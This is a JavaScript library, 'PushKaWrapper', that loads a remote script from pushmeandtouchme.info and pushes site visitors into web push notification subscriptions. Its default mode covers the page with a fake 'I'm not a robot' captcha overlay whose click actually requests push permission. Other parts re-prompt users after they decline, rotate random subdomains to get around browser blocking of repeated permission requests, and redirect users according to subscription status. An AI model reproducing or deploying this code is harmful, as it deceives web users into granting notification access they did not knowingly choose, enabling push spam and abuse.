'use strict';

var PushKaWrapper = function( params )
{
    this.config = {
        pid             : 1,
        sourceId        : 1,
        appId           : null,
        landingId       : null,
        manifestUrl     : 'https://pushmeandtouchme.info/app/manifest.json',
        pushKaScript    : 'https://pushmeandtouchme.info/push.js?b=1',
        //pushKaScript    : 'http://127.0.0.1/push.js',
        popupUrl        : 'https://pushmeandtouchme.info/redirect',
        captchaImage    : 'https://pushmeandtouchme.info/media/landings/captcha/images/captcha.jpg',
        //captchaImage    : 'http://127.0.0.1/media/landings/captcha/images/captcha.jpg',
        //popupUrl        : 'http://localhost/landing/captcha/redirect',
        //popupUrl        : 'http://127.0.0.1/landing/captcha/redirect',
        redirect        : {
            count          : 1,
            declineCount   : 3,
            maxSubsCount   : 10,
            successUrl     : null,
            alreadyUrl     : null,
            declineUrl     : null,
            trafficbackUrl : null,
        },
        namePrefix      : 'pushka-',
        popupType       : 'captcha',      // captcha | gray
        popupTimeout    : 10*60,
        startPopupDelay : 5,
        subsCheckExpire : 1*24*60*60,
        subsStatusExpire: 15*60,
        lang            : 'en',
        languages       : {
            ru : {
                btnSubscribe : 'Подписаться',
                btnContinue  : 'Продолжить',
                btnCancel    : 'Отмена',
                btnClose     : 'Закрыть',
                notRobot     : 'Я не робот',
                popupTitle   : 'Получать оповещения о последних новостях с сайта',
                popupText    : 'Для того чтобы продолжить работу, разрешите подписку'
            },
            en : {
                btnSubscribe : 'Subscribe',
                btnContinue  : 'Continue',
                btnCancel    : 'Cancel',
                btnClose     : 'Close',
                notRobot     : 'I\'m not a robot',
                popupTitle   : 'Get notification about actual news from site',
                popupText    : 'To continue, enable the subscription'
            }
        },
        marks : {
            utm_source   : null,
            utm_medium   : null,
            utm_campaign : null,
            utm_term     : null,
            utm_content  : null
        },
        addVars : {},
        afterInitSubsStatus : function(status){}
    };

    var self = this;
    var objPushKa;
    var overlayBox;
    var redirectStatus = 'default';

    this.start     = start;
    this.popup     = popup;
    this.prompt    = prompt;
    this.redirect  = redirect;

    extend(this.config, params, {});

    function text(tid)
    {
        return self.config.languages[self.config.lang][tid] ? self.config.languages[self.config.lang][tid] : tid;
    }

    function extend(target) {
        if(!arguments[1])
            return;

        for(var i=1; i < arguments.length; i++) {
            var source = arguments[i];

            for(var prop in source) {
                if(source.hasOwnProperty(prop))
                {
                    if( typeof target[prop] === 'object' && target[prop] !== null )
                        extend(target[prop], source[prop]);
                    else
                        target[prop] = source[prop];
                }
            }
        }
    }

    function randomInteger(min, max) {
        var rand = min + Math.random() * (max + 1 - min);
        rand = Math.floor(rand);
        return rand;
    }

    /********************************************/

    function redirect(count, successUrl, alreadyUrl, declineUrl, trafficbackUrl, maxSubsCount, declineCount)
    {
        self.config.redirect.count          = count;
        self.config.redirect.successUrl     = successUrl;
        self.config.redirect.alreadyUrl     = alreadyUrl;
        self.config.redirect.declineUrl     = declineUrl;
        self.config.redirect.trafficbackUrl = trafficbackUrl;
        self.config.redirect.declineCount   = declineCount > 0 ? declineCount : self.config.redirect.declineCount;
        self.config.redirect.maxSubsCount   = maxSubsCount > 0 ? maxSubsCount : self.config.redirect.maxSubsCount;

        createManifest(self.config.manifestUrl);

        if( 'PushKa' in window )
            startRedirect();
        else
            loadScript(self.config.pushKaScript, startRedirect, function(){console.error('Error on load PushKa script')});
    }

    function redirectAfterInit(subs)
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed' )
        {
            redirectStatus = subsStatus;

            objPushKa.log(objPushKa.subscriptionCount+' > '+self.config.redirect.maxSubsCount);

            if( objPushKa.subscriptionCount >= self.config.redirect.maxSubsCount )
                doRedirect(self.config.redirect.alreadyUrl);
            else if(subsStatus === 'activated')
                objPushKa.subscribe();
            else
                redirectRetrySubs();
        }
        else
            objPushKa.subscribe();
    }

    function successSubsRedirect()
    {
        redirectStatus = 'subscribed';

        setTimeout(function(){
            if( objPushKa.subscriptionCount >= self.config.redirect.maxSubsCount )
                doRedirect(self.config.redirect.successUrl);
            else
                redirectRetrySubs();
        }, 1000);  // redirect after 1 sec
    }

    function notSupportRedirect()
    {
        redirectStatus = 'notSupportRedirect';

        doRedirect(self.config.redirect.trafficbackUrl);
    }

    function redirectRetrySubs()
    {
        var urlObj   = new URL(window.location.href);
        var counter  = parseInt(urlObj.searchParams.get("c_rand"));
        var declined = parseInt(urlObj.searchParams.get("d_rand"));

        counter  = counter  ? parseInt(counter)  : 1;
        declined = declined ? parseInt(declined) : 0;

        if( redirectStatus !== 'subscribed' )   // if decline user
            declined ++;

        urlObj.searchParams.set('d_rand', declined);
        urlObj.searchParams.set('c_rand', counter + 1);

        if( counter >= self.config.redirect.count || declined >= self.config.redirect.declineCount )
        {
            redirectStatus = 'declined';

            return doRedirect(self.config.redirect.declineUrl);
        }

        var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2');
        var newUrl   = urlObj.protocol+'//ms-'+randomInteger(1,99)+'.'+hostname+urlObj.pathname+urlObj.search;

        objPushKa.log('refresh: to new page: '+newUrl);

        redirectStatus = 'redirected';

        doRedirect(newUrl);

        return true;
    }

    function startRedirect()
    {
        objPushKa = new PushKa({
            mode         :'all-origin', /* 'system-origin', 'same-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            addVars      : self.config.addVars,
            declined     : redirectRetrySubs,
            afterInit    : redirectAfterInit,
            subscribe    : successSubsRedirect,
            notSupported : notSupportRedirect
        });

        if( window.opener )
            window.addEventListener('beforeunload', function(){ window.opener.postMessage(redirectStatus, '*');});

        //objPushKa.config.afterInit = function(subs);
    }

    function doRedirect(url)
    {
        if( url )
        {
            if( objPushKa )
                objPushKa.log('To url: '+url);
            window.location.href = url;
        }
        else
        {
            if( objPushKa )
                objPushKa.log('Close window');

            if(window.opener)
                window.close();
        }
        return true;
    }

    /********************************************/

    function popup( type, startDelay, timeout )
    {
        self.config.popupType       = type;
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        overlayBox = createOverlay(type);
        //overlayBox.style.display = 'block';
        // createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startPopup();
        else
            loadScript(self.config.pushKaScript, startPopup, function(){console.error('Error on load PushKa script')});
    }

    function startPopup()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode      : 'system-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid       : self.config.pid,
            appId     : self.config.appId,
            sourceId  : self.config.sourceId,
            landingId : self.config.landingId,
            marks     : self.config.marks,
            declined  : initPopupHandler,
            afterInit : initPopupHandler
        });

        //objPushKa.config.afterInit = function(subs);
    }

    function initPopupHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        if( subsStatus === 'unsubscribed' )
            setSubscribeStatus('unsubscribed');

        var subsButton  = document.getElementById(self.config.namePrefix+'subs-button');
        var closeButton = document.getElementById(self.config.namePrefix+'close-overlay-button');
        if( closeButton )
            closeButton.addEventListener('click', closeOverlay);

        if( subsButton )
        {
            subsButton.addEventListener('click', function()
            {
                var popup = window.open(self.config.popupUrl, '', 'width=900,height=450,menubar=no,location=no,resizable=no,scrollbars=no,status=yes');

                window.addEventListener("message", function(event){
                    if( event.data === 'subscribed' )
                    {
                        objPushKa.log("Subscribe by popup");
                        setSubscribeStatus('subscribed');
                    }
                    if( event.data === 'activated' )
                    {
                        objPushKa.log("Already activated by popup");
                        setSubscribeStatus('subscribed');
                    }
                    else if( event.data === 'default' )
                        objPushKa.log("Close popup");
                    else if( event.data === 'declined' )
                        objPushKa.log("Declined by popup");
                    else if( event.data === 'redirected' )
                        objPushKa.log("Popup was redirected");
                    else if( event.data === 'notSupportRedirect' )
                    {
                        setSubscribeStatus('not-support');
                        objPushKa.log("Popup not support push");
                    }
                    else
                        objPushKa.log("Popup sad:"+event.data );

                    closeOverlay();
                }, false);
            });
        }

        setTimeout(startShowOverlay, self.config.startPopupDelay*1000);
    }

    /********************************************/

    function start( startDelay, timeout )
    {
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startInit();
        else
            loadScript(self.config.pushKaScript, startInit, function(){console.error('Error on load PushKa script')});
    }

    function startInit()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode         : 'same-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            afterInit    : initSubscribeHandler,
            subscribe    : successSelfSubs,
            declined     : declineSelfSubs,
            notSupported : notSupportSubs
        });
    }

    function initSubscribeHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        setTimeout(startSubscribe, self.config.startPopupDelay*1000);
    }

    function declineSelfSubs()
    {
        var subsStatus = objPushKa.getSubsStatus();

        console.log('decline');
        console.log(subsStatus);

        setSubscribeStatus(subsStatus);
        setShowOverlayTime();
        startSubscribe();   // for firefox retry request
    }

    function startSubscribe()
    {
        if( getIsSubscribed() || getIsSupport() )
            return false;

        if( isCanShowOverlay() === false )
        {
            setTimeout(startSubscribe, 1000);
            return false;
        }

        objPushKa.subscribe();
        return true;
    }

    /********************************************/

    function prompt( startDelay, timeout )
    {
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        overlayBox = createPrompt('default');
        console.log(overlayBox);
        //overlayBox.style.display = 'block';
        // createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startPrompt();
        else
            loadScript(self.config.pushKaScript, startPrompt, function(){console.error('Error on load PushKa script')});
    }

    function startPrompt()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode         : 'same-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            declined     : initPromptHandler,
            afterInit    : initPromptHandler,
            subscribe    : successSelfSubs,
            notSupported : notSupportSubs
        });

        //objPushKa.config.afterInit = function(subs);
    }

    function initPromptHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        if( subsStatus === 'unsubscribed' )
            setSubscribeStatus('unsubscribed');

        var subsButton  = document.getElementById(self.config.namePrefix+'subs-button');
        var closeButton = document.getElementById(self.config.namePrefix+'close-overlay-button');
        if( closeButton )
            closeButton.addEventListener('click', closeOverlay);

        if( subsButton )
        {
            subsButton.addEventListener('click', function()
            {
                closeOverlay();
                objPushKa.subscribe();
            });
        }

        setTimeout(startShowOverlay, self.config.startPopupDelay*1000);
    }

    function successSelfSubs()
    {
        setShowOverlayTime();   // maybe need comment it row
        setSubscribeStatus('subscribed');
    }

    function notSupportSubs()
    {
        setSubscribeStatus('not-support');
    }

    /********************************************/

    function startShowOverlay()
    {
        if( getIsSubscribed() || getIsSupport() )
            return false;

        if( isCanShowOverlay() === false )
        {
            setTimeout(startShowOverlay, 1000);
            return false;
        }

        setTimeout(showOverlay, 100);
        return true;
    }

    function showOverlay()
    {
        overlayBox.style.display = 'block';
        setShowOverlayTime();
    }

    function closeOverlay()
    {
        overlayBox.style.display = 'none';
        startShowOverlay();
    }

    function setShowOverlayTime()
    {
        if( ("localStorage" in window) !== true )
            return;

        localStorage.setItem(self.config.namePrefix+'overlay-showed', (new Date().getTime()/1000) );
    }

    function getShowOverlayTime()
    {
        if( !("localStorage" in window) )
            return null;

        return localStorage.getItem(self.config.namePrefix+'overlay-showed');
    }

    function isCanShowOverlay()
    {
        var lastShowTime = getShowOverlayTime();
        if( lastShowTime === null )
            return true;

        return (parseInt(lastShowTime) + self.config.popupTimeout) <= (new Date().getTime()/1000);
    }

    /********************************************/

    function loadScript(url, onLoadHandler, onErrorHandler)
    {
        var s = document.createElement("script");
        s.setAttribute('src', url);
        s.type = "text/javascript";
        s.async = true;
        s.onload = onLoadHandler;
        s.onerror = onErrorHandler;

        document.getElementsByTagName('head')[0].appendChild(s);
    }

    function createManifest( url )
    {
        if( document.querySelectorAll('link[rel="manifest"]').length > 0 )
        {
            console.log('manifest already');
            return;
        }

        var s = document.createElement("link");
        s.setAttribute('href', url);
        s.setAttribute('rel', "manifest");

        document.getElementsByTagName('head')[0].appendChild(s);
    }

    /********************************************/

    function setSubscribeStatus(status)
    {
        if( ("localStorage" in window) !== true )
            return;

        localStorage.setItem(self.config.namePrefix+'status', status );
        localStorage.setItem(self.config.namePrefix+'status-time', (new Date().getTime())/1000 );
    }

    function getSubscribeStatus()
    {
        if( !("localStorage" in window) )
            return false;

        var status = localStorage.getItem(self.config.namePrefix+'status');
        if( status === null )
            return false;

        var statusTime = localStorage.getItem(self.config.namePrefix+'status-time');

        return {status:status, time: statusTime === null ? 0 : statusTime};
    }

    function getIsSubscribed()
    {
        var subsStatusData = getSubscribeStatus();
        if( subsStatusData === false )
            return false;

        if(subsStatusData.status !== 'subscribed')
            return false;

        if( subsStatusData.time === null )
            return false;

        return (parseInt(subsStatusData.time) + self.config.subsCheckExpire) >= (new Date().getTime()/1000);
    }

    function getIsSupport()
    {
        var subsStatusData = getSubscribeStatus();
        if( subsStatusData === false )
            return false;

        if(subsStatusData.status !== 'not-support')
            return false;

        if( subsStatusData.time === null )
            return false;

        return (parseInt(subsStatusData.time) + self.config.subsCheckExpire) >= (new Date().getTime()/1000);
    }

    function checkIsCachedStatus(status)
    {
        var subsStatusData = getSubscribeStatus();
        if( subsStatusData === false )
            return false;

        if(subsStatusData.status !== status)
            return false;

        if( subsStatusData.time === null )
            return false;

        return (parseInt(subsStatusData.time) + self.config.subsStatusExpire) >= (new Date().getTime()/1000);
    }

    /********************************************/

    function popupCloseButton()
    {
        return "<div id='"+self.config.namePrefix+'close-overlay-button'+"' title='"+text('btnClose')+"' style='position:fixed; right:20px; top:20px; color:#fff; cursor:pointer; font: bold 20px/10px  Tahoma; '>"+'x'+"</div>";
    }

    function captchaButton()
    {
        var style = "border-radius:3px; " +
            "background: url("+'"'+self.config.captchaImage+'"'+") center center no-repeat; " +
            "width: 250px; " +
            "font: 16px Tahoma; " +
            "display: inline-block; " +
            "text-align: left; " +
            "padding: 40px 10px 40px 70px; " +
            "color:#000; " +
            "cursor:pointer;"

        return "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('notRobot')+"</div>";
    }

    function purposeButton(caption)
    {
        var style = "border-radius:3px; " +
            "background: #0084ff;" +
            "width: 150px; " +
            "font: 16px Tahoma; " +
            "font-weight: bold; " +
            "display: inline-block; " +
            "padding: 10px 20px; " +
            "color: #f3f3f3; " +
            //"text-transform: uppercase; " +
            "cursor: pointer;"

        var titleStyle = "font-size:22px; margin: 0px; padding: 5px 15px 10px";
        var textStyle = "font-size:14px; margin: 0px; padding: 10px 10px 20px";

        return "<div style='color:#fff;'>" +
                "<h3 style='"+titleStyle+"'>"+text('popupTitle')+"</h3>"+
                "<div style='"+textStyle+"'>"+text('popupText')+"</div>"+
                "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+caption+"</div>"+
            "</div>";
    }

    function promptButtons(caption)
    {
        var style = "border-radius:3px; " +
            "background: #0084ff;" +
            "width: 110px; " +
            "font: 16px Tahoma; " +
            "font-weight: bold; " +
            "display: inline-block; " +
            "padding: 10px 20px; " +
            "color: #f3f3f3; " +
            "float: left; " +
            "margin: 0px 5px; " +
            //"text-transform: uppercase; " +
            "cursor: pointer;"

        var titleStyle = "font-size:18px; margin: 0px; padding: 25px 15px 20px";
        //var textStyle = "font-size:14px; margin: 0px; padding: 10px 10px 20px";

        return "<div style='color:#fff;'>" +
            "<h3 style='"+titleStyle+"'>"+text('popupTitle')+"</h3>"+
            //"<div style='"+textStyle+"'>"+text('popupText')+"</div>"+
            "<div style='padding:0px 30px 10px'>"+
                "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('btnSubscribe')+"</div>"+
                "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('btnClose')+"</div>"+
                "<div style='clear:both;'></div>";
            "</div>";
            "</div>";
    }

    function createOverlay(type)
    {
        var overlay = document.createElement("div");
        overlay.style.id              = self.config.namePrefix+'overlay';
        overlay.style.backgroundColor = "rgba(0,0,0,0.8)";
        overlay.style.zIndex          = 100000000;
        overlay.style.position        = 'fixed';
        overlay.style.top             = 0;
        overlay.style.left            = 0;
        overlay.style.bottom          = 0;
        overlay.style.right           = 0;

        if( type === 'captcha' )
            var content = captchaButton();
        else
            var content = popupCloseButton() + purposeButton(text('btnContinue'));

        overlay.innerHTML = "<div id='"+self.config.namePrefix+'inner-box'+"'>" + content + "</div>";

        var box = overlay.querySelector('#'+self.config.namePrefix+'inner-box');

        document.body.appendChild(overlay);
        box.style.marginTop = Math.ceil(((overlay.offsetHeight - box.offsetHeight) / 2)*0.8)+'px';
        box.style.textAlign = 'center';
        //heightEl(overlay);
        //heightEl(box);
        overlay.style.display = 'none';

        return overlay;
    }

    function createPrompt(type)
    {
        var overlay = document.createElement("div");
        overlay.style.id              = self.config.namePrefix+'prompt';
        overlay.style.backgroundColor = "rgba(0,0,0,0.9)";
        overlay.style.zIndex          = 100000000;
        overlay.style.position        = 'fixed';
        overlay.style.borderRadius    = '5px';
        overlay.style.top             = '50px';
        overlay.style.left            = '50px';

        var content = /*popupCloseButton() +*/  promptButtons();

        overlay.innerHTML = "<div id='"+self.config.namePrefix+'inner-box'+"'>" + content + "</div>";

        var box = overlay.querySelector('#'+self.config.namePrefix+'inner-box');

        document.body.appendChild(overlay);
        box.style.marginTop = Math.ceil(((overlay.offsetHeight - box.offsetHeight) / 2)*0.8)+'px';
        box.style.textAlign = 'center';
        //heightEl(overlay);
        //heightEl(box);
        overlay.style.display = 'none';

        return overlay;
    }

    function heightEl(el)
    {
        console.log({
            height       : el.height,
            innerHeight  : el.innerHeight,
            offsetTop    : el.offsetTop,
            offsetHeight : el.offsetHeight,
            availHeight  : el.availHeight
        });
    }
}